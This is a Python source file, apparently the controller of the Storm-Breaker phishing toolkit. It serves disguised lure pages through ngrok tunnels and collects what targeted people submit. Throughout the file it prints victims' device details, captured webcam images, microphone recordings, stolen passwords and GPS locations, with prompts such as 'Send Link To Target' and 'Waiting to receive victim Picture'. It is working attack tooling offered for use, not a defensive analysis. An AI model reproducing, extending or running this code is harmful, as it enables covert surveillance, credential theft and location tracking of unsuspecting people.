from pyngrok import ngrok
from colorama import Fore 
import os
from subprocess import Popen
import urllib
import sys
from modules import banner
import requests
import time
import json
import platform

sysname = platform.uname()[0]

stat_file_ip = 0

with open("config.json", "r") as read_file:
    data = json.load(read_file)
    token = data["ngrok"]

def webcham():
  
  try:
      recv_file = open("webcam/Log.log","w")
      recv_file.write("")
      recv_file.close()
      banner.banner()
      template_list = (Fore.LIGHTCYAN_EX+"""Select Template:

      [1] Deafult
      [2] Mobile Camera
      [3] Avatar X-Men \n""")
      print(template_list)
      print(Fore.RED+" [!] "+Fore.GREEN+"Please Enter The Template\n")

      input1 = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"STORM-BREAKER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.BLUE+"Select-Template"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")

      webcam_mode = ""
      if input1 == "1":
        webcam_mode = "deafult"
      
      #------------------------------------------------

      elif input1 == "2":
        webcam_mode = "camera_temp"

      #------------------------------------------------

      elif input1 == "3":
        webcam_mode = "xmen_temp"
        
  except:
      print("")
      sys.exit()

    # - - - - - - - - - - -- - - - - - - - - - - - - - - -
  file_iptxt = open("webcam/"+webcam_mode+"/info.json","w")
  file_iptxt.write("")
  file_iptxt.close()
    # - - - - - - - - - - -- - - - - - - - - - - - - - - -
  file_recv = open("webcam/"+webcam_mode+"/Log.log","w")
  file_recv.write("")
  file_recv.close()
    # - - - - - - - - - - -- - - - - - - - - - - - - - - -
  def deafult_server():
      with open("logs/deaf_log","w") as deafult:
          Popen(('php','-S','localhost:4545','-t','webcam/'+webcam_mode),stdout=deafult,stderr=deafult)
    
  deafult_server()
    # - - - - - - - - - - -- - - - - - - - - - - - - - - -
  banner.banner()
  global token
  a = ngrok.connect(4545,"http",auth_token=token)
  print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
  print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Please Send Link To Target")
    # - - - - - - - - - - -- - - - - - - - - - - - - - - -

  def info():
    time.sleep(4)
    global stat_file_ip
    if not str(os.stat('webcam/'+webcam_mode+'/info.json').st_size) == stat_file_ip:
      stat_file_ip = str(os.stat('webcam/'+webcam_mode+'/info.json').st_size)
      file_ip  = open('webcam/'+webcam_mode+'/info.json',"r")
      i = file_ip.read()
      try:
        infor = json.loads(i)
        for value in infor['dev']:
          print(Fore.GREEN+"\n Os IP : "+Fore.WHITE+value['Os-Ip'])
          print(Fore.GREEN+" Os Name : "+Fore.WHITE+value['Os-Name'])
          print(Fore.GREEN+" Os Version : "+Fore.WHITE+value['Os-Version'])
          print(Fore.GREEN+" CPU Cores : "+Fore.WHITE+value['CPU-Core'])
          print(Fore.GREEN+" Browser Name : "+Fore.WHITE+value['Browser-Name'])
          print(Fore.GREEN+" Browser Version : "+Fore.WHITE+value['Browser-Version'])
          print(Fore.GREEN+" CPU Architecture : "+Fore.WHITE+value['CPU-Architecture'])
          print(Fore.GREEN+" Resolution : "+Fore.WHITE+value['Resolution'])
          print(Fore.GREEN+" Time Zone : "+Fore.WHITE+value['Time-Zone'])
          print(Fore.GREEN+" System Language : "+Fore.WHITE+value['Language'])
          print(Fore.GREEN+"\n [!] "+Fore.RED+" Waiting to receive victim Picture\n")
          file_recv = open("webcam/"+webcam_mode+"/info.json","w")
          file_recv.write("")
          file_recv.close()
        
      except:
        print("")
 # - - - - - - - - - - -- - - - - - - - - - - - - - - -   
  def read_recv():
    time.sleep(4)
    global stat_file_ip
    if not str(os.stat("webcam/"+webcam_mode+"/Log.log").st_size) == stat_file_ip:
      stat_file_ip = str(os.stat("webcam/"+webcam_mode+"/Log.log").st_size)
      filercv = open("webcam/"+webcam_mode+"/Log.log","r")
      i = filercv.readlines()
      try:
        i = i[-1]
        i = i.strip()
          # - - - - - - - - - - -- - - - - - - - - - - - - - - -
        print(Fore.GREEN+" [+] "+Fore.WHITE+"Image %s Place Check /images Folder"%(i))
        o = open("webcam/"+webcam_mode+"/Log.log","w")
        o.write("")
        o.close()
      except:
        print(" ")
  # - - - - - - - - - - -- - - - - - - - - - - - - - - -   
  while True:
    read_recv()
    info()
      


        



def micro():
    file_iptxt = open("microphone/info.json","w")
    file_iptxt.write("")
    file_iptxt.close()
    # - - - - - - - - - - -- - - - - - - - - - - - - - - -
    file_recv = open("microphone/Log.log","w")
    file_recv.write("")
    file_recv.close()
    # - - - - - - - - - - -- - - - - - - - - - - - - - - -
    def deafult_server():
        with open("logs/deaf_log","w") as deafult:
            Popen(('php','-S','localhost:6565','-t','microphone'),stdout=deafult,stderr=deafult)
    
    deafult_server()
    # - - - - - - - - - - -- - - - - - - - - - - - - - - -
    banner.banner()
    global token
    a = ngrok.connect(6565,"http",auth_token=token)
    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
    print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Please Send Link To Target")
    # - - - - - - - - - - -- - - - - - - - - - - - - - - -

    def info():
      global stat_file_ip
      if not str(os.stat('microphone/info.json').st_size) == stat_file_ip:
        stat_file_ip = str(os.stat('microphone/info.json').st_size)
        file_ip  = open('microphone/info.json',"r")
        i = file_ip.read()
        try:
          infor = json.loads(i)
          for value in infor['dev']:
            print(Fore.GREEN+"\n Os IP : "+Fore.WHITE+value['Os-Ip'])
            print(Fore.GREEN+" Os Name : "+Fore.WHITE+value['Os-Name'])
            print(Fore.GREEN+" Os Version : "+Fore.WHITE+value['Os-Version'])
            print(Fore.GREEN+" CPU Cores : "+Fore.WHITE+value['CPU-Core'])
            print(Fore.GREEN+" Browser Name : "+Fore.WHITE+value['Browser-Name'])
            print(Fore.GREEN+" Browser Version : "+Fore.WHITE+value['Browser-Version'])
            print(Fore.GREEN+" CPU Architecture : "+Fore.WHITE+value['CPU-Architecture'])
            print(Fore.GREEN+" Resolution : "+Fore.WHITE+value['Resolution'])
            print(Fore.GREEN+" Time Zone : "+Fore.WHITE+value['Time-Zone'])
            print(Fore.GREEN+" System Language : "+Fore.WHITE+value['Language'])
            print(Fore.GREEN+"\n [!] "+Fore.RED+" Waiting to receive victim Voice\n")
            file_recv = open("microphone/info.json","w")
            file_recv.write("")
            file_recv.close()
        
        except:
          print("")
 # - - - - - - - - - - -- - - - - - - - - - - - - - - -   
    def read_recv():
      global stat_file_ip
      if not str(os.stat("microphone/Log.log").st_size) == stat_file_ip:
        stat_file_ip = str(os.stat("microphone/Log.log").st_size)
        filercv = open("microphone/Log.log","r")
        i = filercv.readlines()
        try:
          i = i[-1]
          i = i.strip()
          # - - - - - - - - - - -- - - - - - - - - - - - - - - -
          print(Fore.GREEN+"\n [+] "+Fore.WHITE+"Voice %s Place Check /microphone/play Folder"%(i))
          o = open("microphone/Log.log","w")
          o.write("")
          o.close()
        except:
          print(" ")
    
    while True:
      info()
      read_recv()


stat_file = 0

def screen():
    file_recv = open("password/passwords.txt","w")
    file_recv.write("")
    file_recv.close()

    # - - - - - - - - - - -- - - - - - - - - - - - - - - -

    file_recv = open("password/info.json","w")
    file_recv.write("")
    file_recv.close()
      # - - - - - - - - - - -- - - - - - - - - - - - - - - -
    def deafult_server():
        with open("logs/screen_log.log","w") as deafult:
            Popen(('php','-S','localhost:4387','-t','password'),stdout=deafult,stderr=deafult)
      
    deafult_server()
      # - - - - - - - - - - -- - - - - - - - - - - - - - - -
    global token
    a = ngrok.connect(4387,"http",auth_token=token)
    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
    print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Please Send Link To Target")


    def info():
      global stat_file_ip
      if not str(os.stat('password/info.json').st_size) == stat_file_ip:
        stat_file_ip = str(os.stat('password/info.json').st_size)
        file_ip  = open('password/info.json',"r")
        i = file_ip.read()
        try:
          infor = json.loads(i)
          for value in infor['dev']:
            print(Fore.GREEN+"\n Os IP : "+Fore.WHITE+value['Os-Ip'])
            print(Fore.GREEN+" Os Name : "+Fore.WHITE+value['Os-Name'])
            print(Fore.GREEN+" Os Version : "+Fore.WHITE+value['Os-Version'])
            print(Fore.GREEN+" CPU Cores : "+Fore.WHITE+value['CPU-Core'])
            print(Fore.GREEN+" Browser Name : "+Fore.WHITE+value['Browser-Name'])
            print(Fore.GREEN+" Browser Version : "+Fore.WHITE+value['Browser-Version'])
            print(Fore.GREEN+" CPU Architecture : "+Fore.WHITE+value['CPU-Architecture'])
            print(Fore.GREEN+" Resolution : "+Fore.WHITE+value['Resolution'])
            print(Fore.GREEN+" Time Zone : "+Fore.WHITE+value['Time-Zone'])
            print(Fore.GREEN+" System Language : "+Fore.WHITE+value['Language'])
            print(Fore.GREEN+"\n [!] "+Fore.RED+" Waiting to receive victim password\n")
            file_recv = open("password/info.json","w")
            file_recv.write("")
            file_recv.close()
        
        except:
          print("")
  


    def read_recv():
      global stat_file_ip
      if not str(os.stat("password/passwords.txt").st_size) == stat_file_ip:
        stat_file_ip = str(os.stat("password/passwords.txt").st_size)
        filercv = open("password/passwords.txt","r")
        i = filercv.readlines()
        try:
          i = i[-1]
          i = i.strip()
          # - - - - - - - - - - -- - - - - - - - - - - - - - - -
          print(Fore.RED+"\n [+] "+Fore.GREEN+"Password : %s "%(i))
          o = open("password/passwords.txt","w")
          o.write("")
          o.close()
        except:
          print(" ")

    while True:
      info()
      read_recv()
      




def location():
  print(Fore.YELLOW+""" Select Template:

  [1] nearyou
  [2] weather
  """)
  try:

    temp = ""
    input_loc = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"STORM-BREAKER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.WHITE+"GET-LOC"+Fore.RED+"/"+Fore.BLUE+"Select-Template"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")


    if input_loc =="1":
      temp = "nearyou"
    
    elif input_loc == "2":
      temp = "weather"

    else:
      temp = "weather"


  except:
    print("")
    sys.exit()

  result_file = open("getloc/"+temp+"/result.json","w")
  result_file.write("")
  result_file.close()
  #---------------------------------------------------------------
  info_file = open("getloc/"+temp+"/info.json","w")
  info_file.write("")
  info_file.close()
  #---------------------------------------------------------------
  banner.banner()
  def deafult_server():
      with open("logs/location_log.log","w") as deafult:
          Popen(('php','-S','localhost:8767','-t','getloc/'+temp),stdout=deafult,stderr=deafult)
  
  deafult_server()
      # - - - - - - - - - - -- - - - - - - - - - - - - - - -
  global token
  a = ngrok.connect(8767,"http",auth_token=token)
  print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
  print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Please Send Link To Target")


  def info():
    time.sleep(4)
    global stat_file_ip
    if not str(os.stat('getloc/'+temp+'/info.json').st_size) == stat_file_ip:
      stat_file_ip = str(os.stat('getloc/'+temp+'/info.json').st_size)
      file_ip  = open('getloc/'+temp+'/info.json',"r")
      i = file_ip.read()
      try:
        infor = json.loads(i)
        for value in infor['dev']:
          print(Fore.GREEN+"\n  Os IP : "+Fore.WHITE+value['Os-Ip'])
          print(Fore.GREEN+"  Os Name : "+Fore.WHITE+value['Os-Name'])
          print(Fore.GREEN+"  Os Version : "+Fore.WHITE+value['Os-Version'])
          print(Fore.GREEN+"  CPU Cores : "+Fore.WHITE+value['CPU-Core'])
          print(Fore.GREEN+"  Browser Name : "+Fore.WHITE+value['Browser-Name'])
          print(Fore.GREEN+"  Browser Version : "+Fore.WHITE+value['Browser-Version'])
          print(Fore.GREEN+"  CPU Architecture : "+Fore.WHITE+value['CPU-Architecture'])
          print(Fore.GREEN+"  Resolution : "+Fore.WHITE+value['Resolution'])
          print(Fore.GREEN+"  Time Zone : "+Fore.WHITE+value['Time-Zone'])
          print(Fore.GREEN+"  System Language : "+Fore.WHITE+value['Language'])
          print(Fore.GREEN+"\n [!] "+Fore.RED+"Waiting for User Interaction")
          file_recv = open("getloc/"+temp+"/info.json","w")
          file_recv.write("")
          file_recv.close()
        
      except:
        print("")


  def recv_loc():
    time.sleep(4)
    global stat_file_ip
    if not str(os.stat('getloc/'+temp+'/result.json').st_size) == stat_file_ip:
      stat_file_ip = str(os.stat('getloc/'+temp+'/result.json').st_size)
      file_ip  = open('getloc/'+temp+'/result.json',"r")
      i = file_ip.read()
      try:
        infor = json.loads(i)
        for value in infor['info']:
          print(Fore.WHITE+"\n Google Map Link : "+Fore.GREEN+f"https://www.google.com/maps/place/{value['lat']}+{value['lon']}")
          
          print(Fore.GREEN+"\n [!] "+Fore.WHITE+"Ha Ha Ha (: ")
          file_recv = open("getloc/"+temp+"/result.json","w")
          file_recv.write("")
          file_recv.close()
        
      except:
        print("")


  while True:
    info()
    recv_loc()






 